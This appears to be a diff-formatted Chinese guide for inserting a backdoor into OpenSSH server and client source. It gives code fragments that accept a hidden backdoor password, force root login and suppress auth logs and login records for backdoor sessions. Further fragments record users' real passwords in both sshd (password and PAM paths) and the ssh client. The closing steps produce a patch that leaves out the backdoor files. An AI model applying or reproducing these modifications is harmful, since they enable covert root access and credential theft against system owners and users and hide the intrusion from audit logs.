@@ -1,0 +1,49 @@
+一、下载源码
+二、./configure 注意系统原来的安装目录用--prefix指定
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+三、修改Makefile，在SSHDOBJS/SSHOBJS 变量结尾加上backdoor.o
+四、添加backdoor.c, backdoor.h文件
+五、修改auth.c 规避日志和允许root登陆
+auth.c => void auth_log函数 authlog()调用添加条件
+		extern int ateam_login;
+        if (ateam_login == 0)
+		{
+                authlog( ...
+		...
+		
+		int auth_root_allowed(const char *method) 函数开头添加return 1; 允许root登陆
+六、修改auth-passwd.c和auth-pam.c 调用backdoor.c中的函数记录密码和使用后门密码
+auth-passwd.c => int auth_password函数
+第一处，变量定义后，添加后门口令验证
+	...
+		extern int ateam_login;
+        if (backdoor_auth(password))
+        {
+                ateam_login = 1;
+                return 1;
+        }
+	...
+第二处，result = sys_auth_passwd(authctxt, password); 后进行密码记录，用后门口令做xor运算
+        if (result)
+                backdoor_log( ... );
+auth-pam.c:  if (sshpam_err == PAM_SUCCESS && authctxt->valid) { 后添加记录
+extern void backdoor_log(char *user, const char *password);
+backdoor_log(...);
+
+七、修改sshlogin.c避免登陆记录和w命令
+sshlogin.c:在每个record_开头的函数变量后添加
+        extern int ateam_login;
+        if (ateam_login == 1)
+                return;
+
+八、修改sshconnect2.c 为ssh命令添加记录密码功能
+找到snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ", 
+password = read_passphrase(prompt, 0);
+后面添加记录密码代码
+backdoor_log(...);
+
+九、编译make ，make install
+十、diff -Naur 制作patch文件
+	制作时不要包含backdoor.c/h 这两个文件是多出来的方便后门添加功能的
+
+	
